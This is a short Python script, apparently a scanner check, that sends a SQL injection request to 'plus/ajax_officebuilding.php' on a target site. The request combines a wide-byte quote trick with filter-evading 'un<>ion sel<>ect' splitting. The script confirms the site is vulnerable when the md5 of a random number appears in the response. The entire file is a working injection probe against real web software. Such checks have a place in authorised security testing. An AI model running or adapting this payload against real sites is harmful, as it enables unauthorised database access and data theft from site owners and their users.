import requests, re, urllib3
from hashlib import md5

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


def randomInt(s, e):
    import random
    key = random.randint(int(s), int(e))
    return key


rand = randomInt(200000000, 210000000)


def doCheck(url):
    if url[-1] != "/":
        url = url + "/"
    targetUrl = url + "plus/ajax_officebuilding.php?act=key&key=錦%27%20a<>nd%201=2%20un<>ion%20sel<>ect%201,2,3,md5(" + str(
        rand) + "),5,6,7,8,9%23"
    headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:105.0) Gecko/20100101 Firefox/105.0"}
    response = requests.get(targetUrl, headers=headers, timeout=5, verify=False)
    if md5(str(rand).encode()).hexdigest() in response.text:
        return targetUrl
    else:
        return False

